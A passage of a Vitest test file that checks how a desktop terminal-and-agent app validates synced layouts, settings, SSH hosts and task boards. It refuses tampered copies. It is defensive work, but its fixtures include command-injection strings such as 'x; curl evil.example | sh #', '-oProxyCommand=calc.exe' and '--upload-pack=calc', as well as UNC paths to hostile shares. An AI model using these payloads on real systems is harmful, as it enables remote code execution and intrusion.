// @vitest-environment node
// What a copy of a setup may hold: rebuilt field by field, on the computer that sends and, refusing
// anything out of shape, on the one that receives. What a hostile copy tries is here by name.
import { describe, it, expect } from 'vitest'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { MAX_SYNC_DEPTH, MAX_SYNC_PANES, SYNCED_SETTINGS, finishBoard, finishHosts, finishLayout, hostChangesOf, localFolderOk, localizeRebuilt, pickSettings, rebuildBoard, rebuildHosts, rebuildLayout, rebuildReceived, restoreShadow, safeDeviceName, shapeOf, shrunkFrom, summaryOf } from '../syncSchema'
import { sanitizeTarget, sshArgsFor } from '../remoteHosts'
import { SENSITIVE_SETTINGS } from '../settingsBackup'
import { chosenRootsOfLayout, localRootsOfLayout } from '../worktreeList'
import { DEFAULT_SETTINGS } from '../../renderer/src/settings'

const strict = { strict: true }
const agent = (over = {}) => ({ type: 'leaf', kind: 'agent', id: 'pane-a', agentId: 'claude', shellId: 'powershell', sessionId: 'abcdef-123456', ...over })
const project = (tree, over = {}) => ({ id: 'ws-1', name: 'Project', cwd: 'C:/p', tree, ...over })
const layout = (tree, over = {}) => ({ version: 2, settings: {}, workspaces: [project(tree)], ...over })
const nest = (leaf, levels) => {
  let node = leaf
  for (let i = 0; i < levels; i++) node = { type: 'split', dir: 'row', sizes: [100], children: [node] }
  return node
}
const refused = (value) => expect(() => rebuildLayout(value, strict)).toThrow(expect.objectContaining({ code: 'refused' }))
const panes = (body) => {
  const out = []
  const walk = (n) => {
    if (!n) return
    if (n.type === 'leaf') out.push(n)
    else n.children.forEach(walk)
  }
  body.workspaces.forEach((w) => walk(w.tree))
  return out
}

describe('C1: a copy refused whole', () => {
  it.each([
    ['a command that is not text', layout(agent({ agentCommand: ['calc.exe'] }))],
    ['a command that is an object', layout(agent({ agentCommand: { toString: 'calc.exe' } }))],
    ['the older format: a tree at the top', { version: 1, settings: {}, tree: agent({ agentCommand: 'calc.exe' }) }],
    ['the older format beside a list', layout(null, { tree: agent() })],
    ['a conversation id with a command in it', layout(agent({ sessionId: 'x; calc.exe #' }))],
    ['a conversation id that goes to a host', layout(agent({ remoteHostId: 'ssh-abc', sessionId: 'x; curl evil.example | sh #' }))],
    ['a conversation id that is a number', layout(agent({ sessionId: 123456789 }))],
    ['a pane id the window refuses', layout(agent({ id: 'not a pane id' }))],
    ['a pane id that is not text', layout(agent({ id: ['pane-1'] }))],
    ['an agent id with a path in it', layout(agent({ agentId: '..\\..\\calc' }))],
    ['a kind nobody knows', layout(agent({ kind: 'daemon' }))],
    ['a title that is not text', layout(agent({ title: { a: 1 } }))],
    ['a name that is not text', { version: 2, workspaces: [project(null, { name: 7 })] }],
    ['a folder that is not text', { version: 2, workspaces: [project(null, { cwd: ['C:/x'] })] }],
    ['a project id the window refuses', { version: 2, workspaces: [project(null, { id: 'nope' })] }],
    ['the same pane twice', layout({ type: 'split', dir: 'row', sizes: [50, 50], children: [agent(), agent()] })],
    ['the same project twice', { version: 2, workspaces: [project(null), project(null)] }],
    ['a list of projects that is not one', { version: 2, workspaces: 'x' }],
    ['no list of projects', { version: 2, settings: {} }],
    ['settings that are not an object', { version: 2, settings: [], workspaces: [] }],
    ['a split with no children', layout({ type: 'split', dir: 'row', sizes: [] })],
    ['a split with a direction nobody knows', layout({ type: 'split', dir: 'x', sizes: [50, 50], children: [agent(), agent({ id: 'pane-b' })] })],
    ['a worktree that is not one', layout(agent({ worktree: 'C:/x' }))],
    ['a host id the window refuses', layout(agent({ remoteHostId: '-oProxyCommand=calc.exe' }))],
    ['control characters in a name', layout(agent({ paneName: 'a\u0007b' }))],
    ['a branch that reads as an option', layout(agent({ worktree: { path: 'C:/x', branch: '--upload-pack=calc' } }))],
    ['a split size far above any size', layout({ type: 'split', dir: 'row', sizes: [1e308, 1], children: [agent(), agent({ id: 'pane-b' })] })],
    ['a right-to-left mark in a name', layout(agent({ paneName: 'pro\u202ejectname' }))],
    ['a zero-width space in a name', layout(agent({ paneName: 'pro\u200bject' }))],
    ['a word joiner in a title', layout(agent({ title: 'a\u2060b', titleSet: true }))],
    ['a byte order mark in a project name', { version: 2, workspaces: [project(null, { name: '\ufeffP' })] }],
    ['a host folder that reads as a share here', layout(agent({ remoteHostId: 'ssh-abc', remotePath: '//evil.example/share' }))],
    ['a project on a host in a folder that reads as a share here', { version: 2, workspaces: [project(null, { remote: { hostId: 'ssh-abc', path: '//evil.example/share' } })] }]
  ])('%s', (_what, value) => refused(value))

  it('too deep: refused, not skipped', () => {
    expect(() => rebuildLayout(layout(nest(agent(), MAX_SYNC_DEPTH)), strict)).not.toThrow()
    for (const levels of [MAX_SYNC_DEPTH + 1, 30, 61, 200]) refused(layout(nest(agent({ permissions: 'yolo' }), levels)))
  })

  it('M7: too many panes: refused; the limit itself goes through', () => {
    const many = (count) => ({ type: 'split', dir: 'row', sizes: Array(count).fill(1), children: Array.from({ length: count }, (_, i) => ({ type: 'leaf', kind: 'shell', id: `pane-${i}` })) })
    expect(() => rebuildLayout(layout(many(MAX_SYNC_PANES)), strict)).not.toThrow()
    refused(layout(many(MAX_SYNC_PANES + 1)))
    // Across projects too.
    const half = many(MAX_SYNC_PANES)
    const other = { type: 'split', dir: 'row', sizes: [1, 1], children: [{ type: 'leaf', kind: 'shell', id: 'pane-x' }, { type: 'leaf', kind: 'shell', id: 'pane-y' }] }
    refused({ version: 2, workspaces: [project(half), project(other, { id: 'ws-2' })] })
  })

  it('a valid copy goes through, and the sender\u2019s rebuild is what the receiver gets, unchanged', () => {
    const sent = rebuildLayout(layout(agent({ permissions: 'yolo', agentCommand: 'claude', launchSig: 'x', title: 'Claude', titleSet: true })))
    expect(rebuildLayout(sent, strict)).toEqual(sent)
    expect(JSON.stringify(rebuildLayout(sent, strict))).toBe(JSON.stringify(sent))
  })

  it('the sender takes hidden characters out of its own names, rather than losing the name', () => {
    const sent = rebuildLayout({ version: 2, workspaces: [project(agent({ paneName: 'a\u200db' }), { name: 'Pro\u202eject' })] })
    expect(sent.workspaces[0].name).toBe('Project')
    expect(sent.workspaces[0].tree.paneName).toBe('ab')
    expect(rebuildLayout(sent, strict)).toEqual(sent)
  })

  it('a split size the sender has that is no size becomes an even split', () => {
    const sent = rebuildLayout(layout({ type: 'split', dir: 'row', sizes: [1e308, 1], children: [agent(), agent({ id: 'pane-b' })] }))
    expect(sent.workspaces[0].tree.sizes).toEqual([50, 50])
  })

  it('the sender never refuses its own file: it leaves out what is not valid', () => {
    const sent = rebuildLayout(layout(agent({ agentCommand: ['calc.exe'], sessionId: 'x; calc.exe #' }), { tree: agent() }))
    expect(panes(sent)[0]).toEqual({ type: 'leaf', id: 'pane-a', kind: 'agent', shellId: 'powershell', agentId: 'claude' })
  })
})

describe('what a pane holds in a copy', () => {
  it('never its command, what it may do, or what is this computer\u2019s', () => {
    const [pane] = panes(rebuildLayout(layout(agent({
      agentCommand: 'calc.exe', permissions: 'yolo', permissionMode: 'bypassPermissions', launchYolo: true, rootNoYolo: true, launchSig: 'env=SECRET', accountId: 'acc', hostAccount: 'h',
      lastModel: { id: 'x' }, launchedAt: 1, teamTools: true, toolsVersion: 'v', team: 'team-1', broadcast: true, startDir: 'C:/x', sessionOptions: { model: 'x' }, sleeping: { at: 1 }, agentMissing: true, autoTitle: 'x', chatView: true
    }))))
    expect(pane).toEqual({ type: 'leaf', id: 'pane-a', kind: 'agent', shellId: 'powershell', agentId: 'claude', sessionId: 'abcdef-123456' })
  })

  it('H7: a browser pane keeps its place, never its page or its title', () => {
    const [pane] = panes(rebuildLayout(layout({ type: 'leaf', kind: 'browser', id: 'pane-b', url: 'https://app.example/callback?token=SECRET', title: 'SECRET title', agentSession: true, guestSession: true, zoom: 2 })))
    expect(pane).toEqual({ type: 'leaf', id: 'pane-b', kind: 'browser' })
    expect(JSON.stringify(rebuildLayout(layout(agent({ title: 'a title a page chose' }))))).not.toContain('a page chose')
  })

  it('a name the person gave a pane travels; what a program calls itself does not', () => {
    expect(panes(rebuildLayout(layout(agent({ title: 'Mine', titleSet: true }))))[0]).toMatchObject({ title: 'Mine', titleSet: true })
    expect(panes(rebuildLayout(layout(agent({ title: 'From the terminal' }))))[0].title).toBeUndefined()
  })

  it('M8: a key in a custom command never leaves', () => {
    const text = JSON.stringify(rebuildLayout(layout(agent({ agentCommand: 'aider --api-key sk-CUSTOM-SECRET' }))))
    expect(text).not.toContain('sk-CUSTOM-SECRET')
  })
})

describe('M1: settings are an allowlist', () => {
  it('nothing that decides what agents may do is on the list', () => {
    for (const key of SENSITIVE_SETTINGS) expect(SYNCED_SETTINGS).not.toHaveProperty(key)
  })

  it.each([
    'autoUpdateAgents', 'projectOpen', 'restoreWorkspaces', 'resumeAgents', 'confirmMultilinePaste', 'confirmCloseAgent', 'confirmQuitRunning', 'confirmDeleteWorkspace', 'notificationsEnabled', 'desktopNotifications',
    'inAppAlerts', 'notifyTerminalBell', 'notificationVolume', 'alertSound', 'rightClickPaste', 'copyOnSelect', 'defaultAgent', 'agentSessionOptions', 'hostAccountDefaults', 'linksOpenUrlsIn', 'teamWakeUps', 'agentTerminalBackground',
    'chatIdleMinutes', 'keepAwake', 'agentSleep', 'agentSleepMinutes', 'liveShareHostCommands', 'editorAutoSave', 'branchPrefix', 'branchPrefixCustom', 'voiceTip', 'workspaceDir', 'gpuAcceleration', 'cookiesImportedOnce',
    'contextClaudeSignIn', 'contextGeminiSignIn', 'compactDefaults', 'sidebarShownWorktrees', 'sidebarFilterRepoIds'
  ])('%s stays what this computer has', (key) => {
    expect(SYNCED_SETTINGS).not.toHaveProperty(key)
    expect(pickSettings({ [key]: 'any' })).toEqual({})
  })

  it('every setting on the list is a real one, and its default passes its own check', () => {
    for (const key of Object.keys(SYNCED_SETTINGS)) {
      expect(DEFAULT_SETTINGS, key).toHaveProperty(key)
      expect(SYNCED_SETTINGS[key](DEFAULT_SETTINGS[key]), key).toBe(true)
    }
  })

  it('a setting that is new is not on the list until someone adds it', () => {
    expect(pickSettings({ somethingAddedNextYear: true, theme: 'dark' })).toEqual({ theme: 'dark' })
  })

  it.each([
    ['fontFamily', 'Evil"; }'],
    ['fontSize', 500],
    ['fontSize', '14'],
    ['inactivePaneOpacity', 0],
    ['uiZoomLevel', 99],
    ['cursorStyle', 'evil'],
    ['theme', ['x']]
  ])('a value out of shape is dropped: %s', (key, value) => {
    expect(pickSettings({ [key]: value })).toEqual({})
  })
})

describe('H2 and M6: folders', () => {
  it.each(['C:\\Users\\me\\p', 'C:/Users/me/p', 'Z:\\mapped', '/home/me/p'])('%s can be looked at', (p) => expect(localFolderOk(p)).toBe(true))
  it.each(['\\\\evil\\share', '//evil/share', '/\\evil\\share', '\\/evil/share', '\\\\?\\UNC\\evil\\share', '\\\\.\\C:\\x', '\\??\\UNC\\evil\\share', ' \\\\evil\\share', 'C:relative', 'relative', '', null, 7, 'C:\\a\u0007b', `C:\\${'a'.repeat(2000)}`, 'file:///etc', 'ssh://host/x'])('%s is refused', (p) => expect(localFolderOk(p)).toBe(false))

  const finished = (current) => JSON.parse(finishLayout(JSON.stringify({ version: 2, settings: {}, workspaces: [{ id: 'ws-1', cwd: 'C:/from-copy', tree: null }, { id: 'ws-2', cwd: 'C:/mine', tree: null }, { id: 'ws-3', cwd: null, tree: null }] }), current ? JSON.stringify(current) : null))

  it('a folder that only the copy names is never a folder the person chose', () => {
    const out = finished({ workspaces: [{ id: 'ws-9', cwd: 'c:\\MINE\\', tree: null }] })
    expect(out.workspaces.map((w) => w.fromCopy)).toEqual([true, undefined, undefined])
    expect(chosenRootsOfLayout(out)).toHaveLength(1)
    expect(chosenRootsOfLayout(out)[0].toLowerCase()).toContain('mine')
    expect(localRootsOfLayout(out)).toHaveLength(2)
  })

  it('on a fresh computer, none of them', () => {
    expect(chosenRootsOfLayout(finished(null))).toEqual([])
  })

  it('a mark stays: applying again does not turn it into a choice', () => {
    const once = finished(null)
    expect(chosenRootsOfLayout(finished(once))).toEqual([])
  })

  it('a copy that says it is not from a copy changes nothing: the mark is not read from it', () => {
    const sent = rebuildLayout({ version: 2, workspaces: [{ id: 'ws-1', cwd: 'C:/x', fromCopy: false, tree: null }] }, strict)
    expect(sent.workspaces[0]).not.toHaveProperty('fromCopy')
  })
})

describe('H6: hosts', () => {
  const mine = { version: 1, targets: [
    { id: 'ssh-1', label: 'prod', configHost: 'prod.corp', host: 'prod.corp', port: 22, username: 'me', source: 'manual', proxyCommand: 'ssh -W %h:%p bastion.corp', jumpHost: 'j.corp', identityFile: 'C:\\keys\\mine' },
    { id: 'ssh-only-here', label: 'only here', configHost: 'only.corp', host: 'only.corp', port: 22, username: '', source: 'manual' }
  ], removed: [{ configHost: 'gone' }] }
  const copy = (over = {}) => JSON.stringify(rebuildHosts({ version: 1, targets: [{ id: 'ssh-1', label: 'renamed', host: 'prod.corp', port: 22, username: 'me', source: 'manual', ...over }] }, strict))

  it('never takes a proxy command, a jump host, a key file or an alias from a copy', () => {
    const [target] = rebuildHosts({ targets: [{ id: 'ssh-1', label: 'x', host: 'attacker.example', configHost: 'other.example', source: 'ssh-config', proxyCommand: 'calc.exe', jumpHost: 'x@evil.example:22', identityFile: '\\\\evil.example\\share\\key' }] }, strict).targets
    expect(Object.keys(target).sort()).toEqual(['host', 'id', 'label', 'port', 'username'])
  })

  it('a host keeps its proxy command, jump host and key file; its name only follows on the person\u2019s word', () => {
    const [own] = JSON.parse(finishHosts(copy(), JSON.stringify(mine))).targets
    expect(own).toMatchObject({ label: 'prod', proxyCommand: 'ssh -W %h:%p bastion.corp', jumpHost: 'j.corp', identityFile: 'C:\\keys\\mine' })
    expect(JSON.parse(finishHosts(copy(), JSON.stringify(mine), { addresses: 'copy' })).targets[0]).toMatchObject({ label: 'renamed', proxyCommand: 'ssh -W %h:%p bastion.corp' })
  })

  describe('a host that says one thing and connects to another', () => {
    const wearing = { id: 'ssh-2x', label: 'prod', host: 'prod.corp', port: 22, username: 'me', configHost: 'attacker.invalid', source: 'ssh-config' }
    const body = () => JSON.stringify(rebuildHosts({ targets: [wearing] }, strict))
    const argsOf = (target) => sshArgsFor(sanitizeTarget(target, { id: target.id }).target)

    it('the alias of a copy never reaches ssh: it connects to the address shown', () => {
      const added = JSON.parse(finishHosts(body(), JSON.stringify(mine), { addresses: 'copy' })).targets.find((t) => t.id === 'ssh-2x')
      expect(argsOf(added).at(-1)).toBe('prod.corp')
      expect(argsOf(added).join(' ')).not.toContain('attacker')
    })

    it('a new host is in the question, with its address, and comes only on the person\u2019s word', () => {
      expect(hostChangesOf(body(), JSON.stringify(mine))).toEqual([{ kind: 'added', id: 'ssh-2x', label: 'prod', from: null, to: 'me@prod.corp' }])
      expect(JSON.parse(finishHosts(body(), JSON.stringify(mine))).targets.map((t) => t.id)).toEqual(['ssh-1', 'ssh-only-here'])
    })

    it('an existing host whose alias alone would change: nothing to ask, nothing changes', () => {
      const same = JSON.stringify(rebuildHosts({ targets: [{ id: 'ssh-1', label: 'prod', host: 'prod.corp', port: 22, username: 'me', configHost: 'attacker.invalid', source: 'ssh-config' }] }, strict))
      expect(hostChangesOf(same, JSON.stringify(mine))).toEqual([])
      expect(argsOf(JSON.parse(finishHosts(same, JSON.stringify(mine), { addresses: 'copy' })).targets[0]).at(-1)).toBe('prod.corp')
    })

    it('an address accepted drops the alias it had: it goes where the question said', () => {
      const local = { ...mine, targets: [{ ...mine.targets[0], configHost: 'prod-alias', source: 'ssh-config' }] }
      const moved = JSON.stringify(rebuildHosts({ targets: [{ id: 'ssh-1', label: 'prod', host: 'new.corp', port: 22, username: 'me' }] }, strict))
      const [target] = JSON.parse(finishHosts(moved, JSON.stringify(local), { addresses: 'copy' })).targets
      expect(argsOf(target).at(-1)).toBe('new.corp')
    })

    it('a fresh computer: everything in the copy is new, and asked about', () => {
      expect(hostChangesOf(body(), null)).toEqual([{ kind: 'added', id: 'ssh-2x', label: 'prod', from: null, to: 'me@prod.corp' }])
    })

    it('a label is never taken without the question', () => {
      expect(JSON.parse(finishHosts(copy({ label: 'calm name' }), JSON.stringify(mine))).targets[0].label).toBe('prod')
    })
  })

  describe('a project or a pane moved to another host', () => {
    const remote = (hostId, path = '/srv/app') => ({ hostId, path })
    const here = (tree) => JSON.stringify({ version: 2, settings: {}, workspaces: [{ id: 'ws-1', name: 'App', cwd: null, remote: remote('ssh-1'), tree }] })
    const staged = (over = {}, tree = null) => JSON.stringify({ version: 2, settings: {}, workspaces: [{ id: 'ws-1', name: 'App', cwd: null, remote: remote('ssh-2x'), tree, ...over }] })
    const hosts = JSON.stringify(mine)

    it('is in the question', () => {
      expect(hostChangesOf(null, hosts, staged(), here(null))).toEqual([{ kind: 'moved', id: 'ws-1', label: 'App', from: 'prod:/srv/app', to: 'ssh-2x:/srv/app' }])
      expect(hostChangesOf(null, hosts, staged({ remote: remote('ssh-1', '/tmp/x') }), here(null))[0]).toMatchObject({ from: 'prod:/srv/app', to: 'prod:/tmp/x' })
      expect(hostChangesOf(null, hosts, staged({ remote: remote('ssh-1') }), here(null))).toEqual([])
    })

    it('stays where it is unless the person agreed', () => {
      expect(JSON.parse(finishLayout(staged(), here(null))).workspaces[0].remote).toEqual(remote('ssh-1'))
      expect(JSON.parse(finishLayout(staged(), here(null), { addresses: 'copy' })).workspaces[0].remote).toEqual(remote('ssh-2x'))
    })

    it('a pane moved too: asked, and it stays on its host otherwise', () => {
      const own = { type: 'leaf', id: 'pane-a', kind: 'agent', agentId: 'claude', remoteHostId: 'ssh-1', remotePath: '/srv/app' }
      const pane = { type: 'leaf', id: 'pane-a', kind: 'agent', agentId: 'claude', agentCommand: 'claude', remoteHostId: 'ssh-2x', remotePath: '/tmp/x', sleeping: { at: 1, held: true } }
      expect(hostChangesOf(null, hosts, staged({ remote: remote('ssh-1') }, pane), here(own))[0]).toMatchObject({ kind: 'moved', id: 'pane-a', from: 'prod:/srv/app', to: 'ssh-2x:/tmp/x' })
      expect(JSON.parse(finishLayout(staged({ remote: remote('ssh-1') }, pane), here(own))).workspaces[0].tree).toMatchObject({ remoteHostId: 'ssh-1', remotePath: '/srv/app' })
      expect(JSON.parse(finishLayout(staged({ remote: remote('ssh-1') }, pane), here(own), { addresses: 'copy' })).workspaces[0].tree).toMatchObject({ remoteHostId: 'ssh-2x', remotePath: '/tmp/x' })
    })
  })

  it('a host only on this computer stays, and what it knows of removed hosts', () => {
    const out = JSON.parse(finishHosts(copy(), JSON.stringify(mine)))
    expect(out.targets.map((t) => t.id)).toEqual(['ssh-1', 'ssh-only-here'])
    expect(out.removed).toEqual([{ configHost: 'gone' }])
  })

  it('a changed address is shown, kept as it is here, and taken only on the person\u2019s word', () => {
    const body = copy({ host: 'attacker.example', username: 'root' })
    expect(hostChangesOf(body, JSON.stringify(mine))).toEqual([{ kind: 'changed', id: 'ssh-1', label: 'prod', from: 'me@prod.corp', to: 'root@attacker.example' }])
    const kept = JSON.parse(finishHosts(body, JSON.stringify(mine))).targets[0]
    expect(kept).toMatchObject({ host: 'prod.corp', username: 'me', label: 'prod', proxyCommand: 'ssh -W %h:%p bastion.corp' })
    const taken = JSON.parse(finishHosts(body, JSON.stringify(mine), { addresses: 'copy' })).targets[0]
    expect(taken).toMatchObject({ host: 'attacker.example', username: 'root', proxyCommand: 'ssh -W %h:%p bastion.corp' })
    expect(hostChangesOf(copy(), JSON.stringify(mine))).toEqual([])
  })

  it.each([
    ['a host that reads as an option', { id: 'ssh-2', host: '-oProxyCommand=calc.exe' }],
    ['no host', { id: 'ssh-2' }],
    ['no id', { host: 'x.example' }],
    ['not an object', 'x'],
    ['a hidden character in a name', { id: 'ssh-2', host: 'x.example', label: 'pr\u200bod' }]
  ])('refused whole: %s', (_what, target) => {
    expect(() => rebuildHosts({ targets: [target] }, strict)).toThrow(expect.objectContaining({ code: 'refused' }))
  })
})

describe('M11: the board', () => {
  const copy = (over = {}) => JSON.stringify(rebuildBoard({ tasks: [{ id: 't1', title: 'Do this', column: 'todo', ...over }] }, strict))

  it('a card from a copy never brings a path, a decision or a report', () => {
    const [card] = JSON.parse(copy({ worktree: { path: 'C:/important' }, mergeSha: 'abc', gate: { status: 'pending' }, report: { outcome: 'done' }, guestBy: 'x', copiedFrom: 'x', appliedRequests: ['x'] })).tasks
    expect(Object.keys(card).sort()).toEqual(['column', 'id', 'title'])
  })

  it('words that are new here are marked with the computer they came from', () => {
    expect(JSON.parse(finishBoard(copy(), JSON.stringify({ tasks: [] }), { device: 'OTHER' })).tasks[0].copiedFrom).toBe('OTHER')
    expect(JSON.parse(finishBoard(copy({ title: 'Changed' }), JSON.stringify({ tasks: [{ id: 't1', title: 'Before', column: 'todo' }] }), { device: 'OTHER' })).tasks[0].copiedFrom).toBe('OTHER')
    expect(JSON.parse(finishBoard(copy(), null, {})).tasks[0].copiedFrom).toBe('another computer')
  })

  it('a computer\u2019s name can say who, and nothing else', () => {
    expect(safeDeviceName('your own computer) (typed by the user')).toBe('your own computer typed by the user')
    expect(safeDeviceName('pro\u202eject\u200b')).toBe('pro ject')
    expect(safeDeviceName('DESKTOP-1.local_a')).toBe('DESKTOP-1.local_a')
    expect(safeDeviceName('Ordinateur de Zo\u00e9')).toBe('Ordinateur de Zo\u00e9')
    expect(JSON.parse(finishBoard(copy(), null, { device: 'x) (typed by the user' })).tasks[0].copiedFrom).toBe('x typed by the user')
  })

  it('words this computer already has are not marked, and what happened to the card here stays', () => {
    const own = { id: 't1', title: 'Do this', column: 'doing', worktree: { path: 'C:/w' }, report: { outcome: 'x' } }
    const out = JSON.parse(finishBoard(copy(), JSON.stringify({ tasks: [own], history: [{ id: 'h' }], appliedRequests: ['a'], deleted: ['t1', 't2'] }), { device: 'OTHER' }))
    expect(out.tasks[0]).toEqual({ id: 't1', title: 'Do this', column: 'todo', worktree: { path: 'C:/w' }, report: { outcome: 'x' } })
    expect(out).toMatchObject({ history: [{ id: 'h' }], appliedRequests: ['a'], deleted: ['t2'] })
  })

  it('the agents read it: the window says so to team tools, and the tools say so', () => {
    const app = readFileSync(join(__dirname, '../../renderer/src/App.vue'), 'utf8')
    expect(app).toContain('...(t.copiedFrom ? { copied: t.copiedFrom } : {})')
    expect(app).toContain("(task.copiedFrom ? `(This card's words came from a copy of the settings")
    expect(readFileSync(join(__dirname, '../teamTasks.js'), 'utf8')).toContain('guestName(t.copied)')
    expect(readFileSync(join(__dirname, '../teamMcp/server.cjs'), 'utf8')).toContain('its words came from a copy of the settings made on ${t.copied} (not typed here by the user)')
  })

  it.each([
    ['a title that is not text', { title: 5 }],
    ['no title', { title: undefined }],
    ['an id with a path in it', { id: '../x' }],
    ['a column nobody knows', { column: 'x' }],
    ['a pane id the window refuses', { paneId: 'nope' }],
    ['waiting on something that is not a list', { deps: 'x' }]
  ])('refused whole: %s', (_what, over) => {
    expect(() => rebuildBoard({ tasks: [{ id: 't1', title: 'x', column: 'todo', ...over }] }, strict)).toThrow(expect.objectContaining({ code: 'refused' }))
  })

  it('the older shape is only read from this computer\u2019s own file', () => {
    expect(rebuildBoard([{ id: 't1', title: 'x', column: 'todo' }]).tasks).toHaveLength(1)
    expect(() => rebuildBoard([{ id: 't1', title: 'x', column: 'todo' }], strict)).toThrow()
  })
})

describe('a pane this computer has', () => {
  const stage = (pane) => JSON.stringify({ version: 2, settings: { theme: 'dark' }, workspaces: [{ id: 'ws-1', cwd: 'C:/p', tree: pane }] })
  const asleep = { ...agent(), agentCommand: 'claude', sleeping: { at: 5, held: true } }
  const mine = (pane) => JSON.stringify({ version: 2, settings: { agentPermissions: 'yolo' }, broadcast: true, teams: [{ id: 't' }], sideBrowsers: [{ id: 's' }], sidebarWidth: 300, selectedShell: 'pwsh', currentIndex: 3, workspaces: [{ id: 'ws-1', cwd: 'C:/p', tree: pane }] })

  it('keeps what is its own: its account, its pin, how it started', () => {
    const own = agent({ accountId: 'acc', permissions: 'yolo', launchSig: 'x', launchYolo: true, team: 't', broadcast: false, sessionId: 'old-session' })
    const tree = JSON.parse(finishLayout(stage(asleep), mine(own))).workspaces[0].tree
    expect(tree).toMatchObject({ accountId: 'acc', permissions: 'yolo', launchSig: 'x', team: 't', broadcast: false, sessionId: 'abcdef-123456', sleeping: { at: 5, held: true }, agentCommand: 'claude' })
  })

  it('Low: one still running comes back exactly as it is here, Yolo marker included', () => {
    const own = agent({ launchYolo: true, launchSig: 'sig', permissions: 'yolo', agentCommand: 'my-claude', title: 'As it is here', sessionId: 'mine-123456' })
    const tree = JSON.parse(finishLayout(stage(asleep), mine(own), { running: ['pane-a'] })).workspaces[0].tree
    expect(tree).toEqual(own)
  })

  describe('finding: a local Yolo pin re-aimed by a copy', () => {
    const PINS = { permissions: 'yolo', permissionMode: 'bypassPermissions', launchYolo: true, launchSig: 'sig', rootNoYolo: true, launchedAt: 5 }
    const own = (over = {}) => agent({ agentCommand: 'claude', accountId: 'acc', ...PINS, ...over })
    const finished = (stagedPane, ownPane, ownProject = {}, stagedProject = {}, options = {}) =>
      JSON.parse(finishLayout(JSON.stringify({ version: 2, settings: {}, workspaces: [{ id: 'ws-1', cwd: 'C:/p', tree: stagedPane, ...stagedProject }] }), JSON.stringify({ version: 2, settings: {}, workspaces: [{ id: 'ws-1', cwd: 'C:/p', tree: ownPane, ...ownProject }] }), options)).workspaces[0].tree
    const asleepPane = (over = {}) => ({ ...agent(), agentCommand: 'claude', sleeping: { at: 5, held: true }, ...over })

    it('nothing changed: it keeps what it may do', () => {
      expect(finished(asleepPane(), own())).toMatchObject(PINS)
    })

    it.each([
      ['its folder (a copy of the project)', asleepPane({ worktree: { path: 'C:/p/planted', branch: 'x' } }), {}, {}],
      ['its agent', asleepPane({ agentId: 'codex', agentCommand: 'codex' }), {}, {}],
      ['its project\u2019s folder', asleepPane(), {}, { cwd: 'C:/planted' }]
    ])('the copy changes %s: it loses them, and keeps what is not about that', (_what, pane, ownProject, stagedProject) => {
      const tree = finished(pane, own(), ownProject, stagedProject)
      for (const key of Object.keys(PINS)) expect(tree).not.toHaveProperty(key)
      expect(tree.accountId).toBe('acc')
    })

    it.each([
      ['its host', asleepPane({ remoteHostId: 'ssh-2x' })],
      ['its folder on a host', asleepPane({ remoteHostId: 'ssh-1', remotePath: '/tmp/x' })]
    ])('the copy changes %s, and the person agrees: it loses them too', (_what, pane) => {
      const tree = finished(pane, own({ remoteHostId: 'ssh-1', remotePath: '/srv/app' }), {}, {}, { addresses: 'copy' })
      for (const key of Object.keys(PINS)) expect(tree).not.toHaveProperty(key)
    })

    it('moved to another project: the same', () => {
      const out = JSON.parse(
        finishLayout(
          JSON.stringify({ version: 2, settings: {}, workspaces: [{ id: 'ws-2', cwd: 'C:/planted', tree: asleepPane() }] }),
          JSON.stringify({ version: 2, settings: {}, workspaces: [{ id: 'ws-1', cwd: 'C:/p', tree: own() }] })
        )
      )
      for (const key of Object.keys(PINS)) expect(out.workspaces[0].tree).not.toHaveProperty(key)
    })

    it('one still running keeps all of it: nothing about it changes', () => {
      expect(finished(asleepPane({ agentId: 'codex' }), own(), {}, {}, { running: ['pane-a'] })).toMatchObject(PINS)
    })
  })

  describe('finding: a pane said to run here', () => {
    const SHARE = '\\\\evil.invalid\\share'
    const made = (tree) => localizeRebuilt(rebuildLayout({ version: 2, settings: {}, workspaces: [project(tree)] }, strict), { agents: new Map([['claude', { command: 'claude', name: 'Claude', available: true }]]), folderExists: () => true, now: () => 1 }).layout

    it.each([
      ['an editor on a share', { type: 'leaf', id: 'pane-a', kind: 'editor', files: [{ path: `${SHARE}\\f.txt` }] }],
      ['a chat in a share', { type: 'leaf', id: 'pane-a', kind: 'chat', agentId: 'claude', cwd: SHARE, projectDir: SHARE }],
      ['a terminal in a share', { type: 'leaf', id: 'pane-a', kind: 'shell', worktree: { path: SHARE, branch: 'b' } }],
      ['an agent in a share', agent({ worktree: { path: SHARE, branch: 'b' } })]
    ])('%s goes through the localizer like any other, whatever is said to run', (_what, pane) => {
      expect(JSON.stringify(made(pane))).not.toContain('evil.invalid')
    })

    it('the person closed it before the restart: what comes back is what was made ready, not what was said', () => {
      const body = JSON.stringify(made({ type: 'leaf', id: 'pane-a', kind: 'editor', files: [{ path: `${SHARE}\\f.txt` }] }))
      const tree = JSON.parse(finishLayout(body, JSON.stringify({ version: 2, workspaces: [] }), { running: ['pane-a'] })).workspaces[0].tree
      expect(JSON.stringify(tree)).not.toContain('evil.invalid')
      expect(tree.sleeping).toEqual({ at: 1, held: true })
    })

    it('still there: its own pane, as it is; only a terminal or an agent can be that', () => {
      const own = { type: 'leaf', id: 'pane-a', kind: 'shell', title: 'Mine' }
      const body = JSON.stringify(made({ type: 'leaf', id: 'pane-a', kind: 'shell' }))
      expect(JSON.parse(finishLayout(body, JSON.stringify({ workspaces: [{ id: 'ws-9', tree: own }] }), { running: ['pane-a'] })).workspaces[0].tree).toEqual(own)
      const page = { type: 'leaf', id: 'pane-a', kind: 'browser', url: 'https://mine.example/' }
      const browser = JSON.stringify(made({ type: 'leaf', id: 'pane-a', kind: 'shell' }))
      expect(JSON.parse(finishLayout(browser, JSON.stringify({ workspaces: [{ id: 'ws-9', tree: page }] }), { running: ['pane-a'] })).workspaces[0].tree.kind).toBe('shell')
    })
  })

  it('a browser pane keeps its own page here', () => {
    const own = { type: 'leaf', kind: 'browser', id: 'pane-b', url: 'https://mine.example/', title: 'Mine' }
    const tree = JSON.parse(finishLayout(stage({ type: 'leaf', kind: 'browser', id: 'pane-b' }), mine(own))).workspaces[0].tree
    expect(tree).toEqual(own)
  })

  it('what is at the top stays this computer\u2019s: teams, broadcast, side browsers, widths', () => {
    const out = JSON.parse(finishLayout(stage(asleep), mine(null)))
